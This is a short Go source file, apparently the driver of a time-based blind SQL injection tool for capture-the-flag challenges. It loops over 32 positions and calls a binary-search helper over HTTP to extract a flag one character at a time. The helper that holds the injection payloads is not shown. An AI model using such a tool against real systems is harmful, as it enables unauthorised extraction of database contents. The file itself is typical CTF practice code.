package timei

import (
	"fmt"
	"sqli/timei/fun"
	"sqli/utils"
	"sqli/utils/http"
)

func Search()  {
	flag := ""
	httpClient := http.HttpClient()
	for i := 0;i < 32 ;i++ {
		str := fun.Binarysearch(i+1,httpClient,utils.Args)
		fmt.Printf("%v ===>>> %v\n",i+1,str)
		flag += str
		fmt.Println(flag)
	}
	fmt.Printf("Get Flang ===>>> %v\n",flag)
}